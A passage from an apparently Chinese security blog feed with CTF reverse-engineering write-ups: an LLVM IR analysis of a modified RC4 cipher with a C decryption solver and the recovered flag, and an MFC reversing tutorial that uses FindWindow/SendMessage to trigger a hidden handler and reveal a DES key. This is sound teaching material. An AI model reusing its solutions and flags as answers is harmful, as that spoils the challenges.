class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">define dso_local <span class="type">void</span> @Rc4_Encrypt(i8*, i32) #<span class="number">0</span> {                                <span class="comment">//RC4_enc function</span></span><br><span class="line">  %<span class="number">3</span> = alloca i8*, align <span class="number">8</span></span><br><span class="line">  %<span class="number">4</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">5</span> = alloca i8, align <span class="number">1</span></span><br><span class="line">  %<span class="number">6</span> = alloca i8, align <span class="number">1</span></span><br><span class="line">  %<span class="number">7</span> = alloca i8, align <span class="number">1</span></span><br><span class="line">  %<span class="number">8</span> = alloca i8, align <span class="number">1</span></span><br><span class="line">  store i8* %<span class="number">0</span>, i8** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  store i32 %<span class="number">1</span>, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  store i8 <span class="number">0</span>, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  store i8 <span class="number">0</span>, i8* %<span class="number">7</span>, align <span class="number">1</span></span><br><span class="line">  store i8 <span class="number">0</span>, i8* %<span class="number">8</span>, align <span class="number">1</span></span><br><span class="line">  br label %<span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>:                                                ; preds = %<span class="number">14</span>, %<span class="number">2</span></span><br><span class="line">  %<span class="number">10</span> = load i8, i8* %<span class="number">8</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">11</span> = zext i8 %<span class="number">10</span> to i32</span><br><span class="line">  %<span class="number">12</span> = load i32, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">13</span> = icmp ult i32 %<span class="number">11</span>, %<span class="number">12</span></span><br><span class="line">  br i1 %<span class="number">13</span>, label %<span class="number">14</span>, label %<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="number">14</span>:                                               ; preds = %<span class="number">9</span></span><br><span class="line">  %<span class="number">15</span> = load i8, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">16</span> = zext i8 %<span class="number">15</span> to i32</span><br><span class="line">  %<span class="number">17</span> = add nsw i32 %<span class="number">16</span>, <span class="number">1</span></span><br><span class="line">  %<span class="number">18</span> = srem i32 %<span class="number">17</span>, <span class="number">256</span></span><br><span class="line">  %<span class="number">19</span> = trunc i32 %<span class="number">18</span> to i8</span><br><span class="line">  store i8 %<span class="number">19</span>, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">20</span> = load i8, i8* %<span class="number">7</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">21</span> = zext i8 %<span class="number">20</span> to i32</span><br><span class="line">  %<span class="number">22</span> = load i8, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">23</span> = zext i8 %<span class="number">22</span> to i64</span><br><span class="line">  %<span class="number">24</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">23</span>               <span class="comment">//生成密钥流</span></span><br><span class="line">  %<span class="number">25</span> = load i8, i8* %<span class="number">24</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">26</span> = zext i8 %<span class="number">25</span> to i32</span><br><span class="line">  %<span class="number">27</span> = add nsw i32 %<span class="number">21</span>, %<span class="number">26</span></span><br><span class="line">  %<span class="number">28</span> = srem i32 %<span class="number">27</span>, <span class="number">256</span></span><br><span class="line">  %<span class="number">29</span> = trunc i32 %<span class="number">28</span> to i8</span><br><span class="line">  store i8 %<span class="number">29</span>, i8* %<span class="number">7</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">30</span> = load i8, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">31</span> = zext i8 %<span class="number">30</span> to i64</span><br><span class="line">  %<span class="number">32</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">31</span></span><br><span class="line">  %<span class="number">33</span> = load i8, i8* %<span class="number">7</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">34</span> = zext i8 %<span class="number">33</span> to i64</span><br><span class="line">  %<span class="number">35</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">34</span>              <span class="comment">//经典Swap了再加</span></span><br><span class="line">  call <span class="type">void</span> @swap(i8* %<span class="number">32</span>, i8* %<span class="number">35</span>)</span><br><span class="line">  %<span class="number">36</span> = load i8, i8* %<span class="number">6</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">37</span> = zext i8 %<span class="number">36</span> to i64</span><br><span class="line">  %<span class="number">38</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">37</span></span><br><span class="line">  %<span class="number">39</span> = load i8, i8* %<span class="number">38</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">40</span> = zext i8 %<span class="number">39</span> to i32</span><br><span class="line">  %<span class="number">41</span> = load i8, i8* %<span class="number">7</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">42</span> = zext i8 %<span class="number">41</span> to i64</span><br><span class="line">  %<span class="number">43</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">42</span></span><br><span class="line">  %<span class="number">44</span> = load i8, i8* %<span class="number">43</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">45</span> = zext i8 %<span class="number">44</span> to i32</span><br><span class="line">  %<span class="number">46</span> = add nsw i32 %<span class="number">40</span>, %<span class="number">45</span></span><br><span class="line">  %<span class="number">47</span> = srem i32 %<span class="number">46</span>, <span class="number">256</span></span><br><span class="line">  %<span class="number">48</span> = sext i32 %<span class="number">47</span> to i64</span><br><span class="line">  %<span class="number">49</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">48</span></span><br><span class="line">  %<span class="number">50</span> = load i8, i8* %<span class="number">49</span>, align <span class="number">1</span></span><br><span class="line">  store i8 %<span class="number">50</span>, i8* %<span class="number">5</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">51</span> = load i8, i8* %<span class="number">5</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">52</span> = zext i8 %<span class="number">51</span> to i32</span><br><span class="line">  %<span class="number">53</span> = xor i32 %<span class="number">52</span>, <span class="number">89</span>                                                         <span class="comment">//xor 89</span></span><br><span class="line">  %<span class="number">54</span> = load i8*, i8** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">55</span> = load i8, i8* %<span class="number">8</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">56</span> = zext i8 %<span class="number">55</span> to i64</span><br><span class="line">  %<span class="number">57</span> = getelementptr inbounds i8, i8* %<span class="number">54</span>, i64 %<span class="number">56</span></span><br><span class="line">  %<span class="number">58</span> = load i8, i8* %<span class="number">57</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">59</span> = zext i8 %<span class="number">58</span> to i32 </span><br><span class="line">  %<span class="number">60</span> = xor i32 %<span class="number">59</span>, %<span class="number">53</span>                                                        <span class="comment">//xor k</span></span><br><span class="line">  %<span class="number">61</span> = trunc i32 %<span class="number">60</span> to i8</span><br><span class="line">  store i8 %<span class="number">61</span>, i8* %<span class="number">57</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">62</span> = load i8, i8* %<span class="number">8</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">63</span> = add i8 %<span class="number">62</span>, <span class="number">1</span></span><br><span class="line">  store i8 %<span class="number">63</span>, i8* %<span class="number">8</span>, align <span class="number">1</span></span><br><span class="line">  br label %<span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="number">64</span>:                                               ; preds = %<span class="number">9</span></span><br><span class="line">  ret <span class="type">void</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>main函数逻辑</p><p>cipher –&gt;RC4_init–&gt;RC4_enc–&gt;RC4_enc–&gt;b64encode</p><p>需要注意一下在RC4_enc的参数中，传入的数据块长度是固定的16，所以说程序进行两次RC4_enc的原因也就确定了，是为了分两次对程序进行加密，也算是一点点小手段，总之，即使让你好好分析.II代码，考察对软件分析的细节，耐心，嘻嘻。</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722616266913-50d3ca26-6e70-46da-8b0e-14d18a348c34.png" alt="12"></p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722615808567-681cd8e8-ce21-4a39-90a3-395b518c3745.png" alt="13"></p><p>OK,理清楚逻辑，就可以试着敲代码解密啦。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>逆向分析过程明了之后，那么写代码就简单多了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">300</span>],t[<span class="number">300</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">b64decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * enc,<span class="type">unsigned</span> <span class="type">char</span>* dec)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_dec1</span><span class="params">(<span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span> *enc)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">char</span> *key,<span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_dec2</span><span class="params">(<span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span> *enc)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">50</span>]=<span class="string">"TSz`kWKgbMHszXaj`@kLBmRrnTxsNtZsSOtZzqYikCw="</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dec1[<span class="number">50</span>]={<span class="number">0x00</span>};</span><br><span class="line">    <span class="type">char</span> key[<span class="number">10</span>] =<span class="string">"llvmbitc"</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a[<span class="number">50</span>];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;      </span><br><span class="line"> </span><br><span class="line">    b64decode(enc,dec1);</span><br><span class="line">    Rc4_Init(key,<span class="number">8</span>);</span><br><span class="line">    Rc4_dec1(<span class="number">16</span>,&amp;dec1[<span class="number">16</span>]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++) {</span><br><span class="line">        dec1[i+<span class="number">16</span>]^=dec1[i];</span><br><span class="line">    }</span><br><span class="line">    Rc4_Init(key,<span class="number">8</span>);</span><br><span class="line">    Rc4_dec2(<span class="number">16</span>,dec1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,dec1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">b64decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * enc,<span class="type">unsigned</span> <span class="type">char</span>* dec)</span> {</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">40</span>;i+=<span class="number">4</span>) {</span><br><span class="line">        dec[j] = ((enc[i]<span class="number">-59</span>)&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xfc</span> | (((enc[i+<span class="number">2</span>]<span class="number">-59</span>)&gt;&gt;<span class="number">4</span>))&amp;<span class="number">3</span>;</span><br><span class="line">        dec[j+<span class="number">1</span>] = (((enc[i+<span class="number">2</span>]<span class="number">-59</span>)&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">4</span>) | (((enc[i+<span class="number">1</span>]<span class="number">-59</span>)&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0xf</span>);</span><br><span class="line">        dec[j+<span class="number">2</span>] = (((enc[i+<span class="number">1</span>]<span class="number">-59</span>)&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>) | ((enc[i+<span class="number">3</span>]<span class="number">-59</span>)&amp;<span class="number">0x3f</span>);</span><br><span class="line">        j+=<span class="number">3</span>;</span><br><span class="line">    }</span><br><span class="line">    dec[j] = ((enc[i]<span class="number">-59</span>)&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xfc</span> | (((enc[i+<span class="number">1</span>]<span class="number">-59</span>)&gt;&gt;<span class="number">4</span>))&amp;<span class="number">3</span>;</span><br><span class="line">    dec[j+<span class="number">1</span>] = (((enc[i+<span class="number">2</span>]<span class="number">-59</span>)&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0xf</span>) | (((enc[i+<span class="number">1</span>]<span class="number">-59</span>)&lt;&lt;<span class="number">4</span>)&amp;<span class="number">0xf0</span>);</span><br><span class="line">    dec[j+<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_Init</span><span class="params">(<span class="type">char</span> *key,<span class="type">int</span> len)</span> {</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,v5=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) {</span><br><span class="line">        s[i] =i;</span><br><span class="line">        t[i] = key[i%len];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) {</span><br><span class="line">        v5=(s[i]+t[i]+v5)%<span class="number">256</span>;</span><br><span class="line">        temp = s[i];</span><br><span class="line">        s[i]= s[v5];</span><br><span class="line">        s[v5]=temp;</span><br><span class="line"> </span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_dec1</span><span class="params">(<span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span> *enc)</span> {</span><br><span class="line">    <span class="type">int</span> v3=<span class="number">0</span>,v5=<span class="number">0</span>,i,j;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) {</span><br><span class="line">        v3=(v3+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        v5=(s[v3]+v5)%<span class="number">256</span>;</span><br><span class="line">        temp=s[v3];</span><br><span class="line">        s[v3]=s[v5];</span><br><span class="line">        s[v5]=temp;</span><br><span class="line">    }</span><br><span class="line">    v5=v3=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) {</span><br><span class="line">        v3=(v3+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        v5 = (s[v3]+v5)%<span class="number">256</span>;</span><br><span class="line">        temp = s[v3];</span><br><span class="line">        s[v3]=s[v5];</span><br><span class="line">        s[v5]=temp;</span><br><span class="line">        enc[i]^=s[(s[v5]+s[v3])%<span class="number">256</span>]^<span class="number">0x59</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">Rc4_dec2</span><span class="params">(<span class="type">int</span> len, <span class="type">unsigned</span> <span class="type">char</span> *enc)</span> {</span><br><span class="line">    <span class="type">int</span> v3=<span class="number">0</span>,v5=<span class="number">0</span>,i,j;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    v5=v3=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++) {</span><br><span class="line">        v3=(v3+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        v5 = (s[v3]+v5)%<span class="number">256</span>;</span><br><span class="line">        temp = s[v3];</span><br><span class="line">        s[v3]=s[v5];</span><br><span class="line">        s[v5]=temp;</span><br><span class="line">        </span><br><span class="line">        enc[i]^=s[(s[v5]+s[v3])%<span class="number">256</span>]^<span class="number">0x59</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722616584064-bd427b34-a520-409f-8f4f-a079391c9cea.png" alt="14"></p><p>flag{Hacking_for_fun@reverser$!}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这么一道CTF题目，深入学习LLVM IR的冰山一角，认真实验，细细分析，相信会对你有极大帮助。</p><p>当然，如果单从解题来说，对于解决一道题有很多的办法，比如说将.II转化为可执行文件，然后IDA分析，但我们旨在学习LLVM IR，这里不再过多赘述。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LLVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MFC框架软件逆向研究</title>
      <link href="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/"/>
      <url>/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="MFC框架简介"><a href="#MFC框架简介" class="headerlink" title="MFC框架简介"></a>MFC框架简介</h1><p>什么是mfc？</p><blockquote><p>MFC库是开发Windows应用程序的C++接口。MFC提供了面向对象的框架，采用面向对象技术，将大部分的Windows API 封装到C++类中，以类成员函数的形式提供给程序开发人员调用。</p></blockquote><p>简单来说，MFC是一种面向对象，用于开发windows应用程序的框架，突出特点是封装了大部分windows API，便于开发人员使用（写win挂方便）。</p><p>MFC程序的运行过程分为以下四步：</p><ol><li>利用全局应用程序对象theApp启动应用程序。</li><li>调用全局应用程序对象的构造函数，从而调用基类（CWinApp）的构造函数,完成应用程序的一些初始化工作，并将应用程序对象的指针保存起来。</li><li>进入WinMain函数。在AfxWinMain函数中获取子类的指针，利用指针实现上述的三个函数，从而完成窗口的创建注册等工作。</li><li>进入消息循环，一直到WM_QUIT。</li></ol><p>那么问题来了，我们如何逆向mfc程序呢？<br>因为其封装了大部分windows API，逆向起来也复杂了不少，因为需要了解大量的windows api 并且熟悉windows编程。<br>下面进行讲解。</p><h1 id="MFC如何逆向"><a href="#MFC如何逆向" class="headerlink" title="MFC如何逆向"></a>MFC如何逆向</h1><p>如下图，是MFC框架软件的基本界面，可以看到，就是一堆button，主要逆向也是check button。<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115322285.png" alt="image-20240902115322285"><br>那么，对于MFC逆向，我们主要需要知道的是，当我们执行某个操作（点击某个按钮)的时候，程序会执行什么处理函数。<br>在mfc中，程序是使用消息机制来实现操作响应的，这个是消息映射表的代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP</span>{</span></span><br><span class="line">    AFX_MSGMAP * pBaseMessageMap;</span><br><span class="line">    AFX_MSGMAP_ENTRY * lpEntries;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AFX_MSGMAP_ENTRY</span>{</span></span><br><span class="line">    UINT nMessage;    <span class="comment">//Windows Message</span></span><br><span class="line">    UINT nCode        <span class="comment">//Control code or WM_NOTIFY code</span></span><br><span class="line">    UINT nID;         <span class="comment">//control ID (or 0 for windows messages)</span></span><br><span class="line">    UINT nLastID;     <span class="comment">//used for entries specifying a range of control id's</span></span><br><span class="line">    UINT nSig;        <span class="comment">//signature type(action) or pointer to message </span></span><br><span class="line">    AFX_PMSG pfn;     <span class="comment">//routine to call (or specical value)</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其中这个<strong>AFX_MSGMAP_ENTRY</strong>中的最后一个成员<strong>AFX_PMSG</strong>就是一个函数指针，指向了当前控件绑定的函数。同时，这个nID成员描述的是当前控件的ID，利用这个ID就能确定我们所寻找的控件。然后这个AFX_MSGMAP结构体则会记录一个指向AFX_MSGMAP_ENTRY的指针，于是查找控件的注册函数的思路可以缩小为:</p><ul><li>找到AFX_MSGMAP</li><li>找到控件的ID — 关键就是找ID</li></ul><p>那么，我们又该怎么找到控件ID呢，俗话说“<strong>工欲善其事，必先利其器</strong>”，作为逆向分析人员，肯定要选择好分析的工具了，很庆幸，我们站在巨人的肩膀上，针对mfc软件程序的逆向分析，前辈们已经开发了一些非常好用的小工具，我们可以直接使用它们。<br>例如：</p><ol><li>xspy</li><li>ResourceHacker</li><li>彗星小助手</li></ol><p>其中我们主要用的是xspy，mfc分析利器<br>如下图所示<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115336471.png" alt="image-20240902115336471"></p><h1 id="逆向实验-以CTF赛题为例讲解"><a href="#逆向实验-以CTF赛题为例讲解" class="headerlink" title="逆向实验-以CTF赛题为例讲解"></a>逆向实验-以CTF赛题为例讲解</h1><h2 id="demo1-MFC初探"><a href="#demo1-MFC初探" class="headerlink" title="demo1 - MFC初探"></a>demo1 - MFC初探</h2><p>打开程序软件<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115344529.png" alt="image-20240902115344529"><br>程序的标题<strong>Flag就在控件中</strong>，然后界面内容是让我们找一个key。<br>很明显，我们需要找到两个东西</p><ol><li>标题找Flag（也就是找窗口句柄）</li><li>内容找key</li></ol><p>根据这些内容，告诉我们我们去找控件，然后这时候就要掏出<br>xspy了。<br>不然的话，我们如果使用老一套经典分析流程，die+ida对用架构分析，会发生下面这样的事。<br>首先die查个架构，查个壳<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115350509.png" alt="image-20240902115350509"><br>好家伙，VMP壳，PE32<br>ida走起，如下图，emmm….<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115355061.png" alt="image-20240902115355061"><br>这样的话，我们很难继续往下分析，所以我们使用xspy分析。<br>使用方法如下图<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115401071.png" alt="image-20240902115401071"><br>首先我们找到了Flag_enc<br>(944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b)<br>我们知道特定的，窗口句柄叫 HWND<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115406110.png" alt="image-20240902115406110"></p><p>然后我们可以发现一条特殊的onMsg<br><code>OnMsg:0464,func= 0x00402170(MFC1.exe+ 0x002170 )</code><br>为什么特殊呢，因为只有它并不是以宏的形式出现，应该是作者自定义的消息，没有button等东西，所以程序怎么点击都无法触发任何效果；并且传入一个特殊数字0464，来触发效果。<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115411170.png" alt="image-20240902115411170"><br>那么，我们需要去发送这条消息来出发func函数以获取我们需要的key</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">HWND h = FindWindowA(<span class="literal">NULL</span>, <span class="string">"Flag就在控件里"</span>);</span><br><span class="line"><span class="keyword">if</span> (h)</span><br><span class="line">{</span><br><span class="line">SendMessage(h, <span class="number">0x0464</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"success"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"failure"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>使用 API FindWindow 获取窗口句柄，SendMessage发送消息，得到了key<br>{I am a Des key}<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115416928.png" alt="image-20240902115416928"><br>最后DES解密即可<br><img 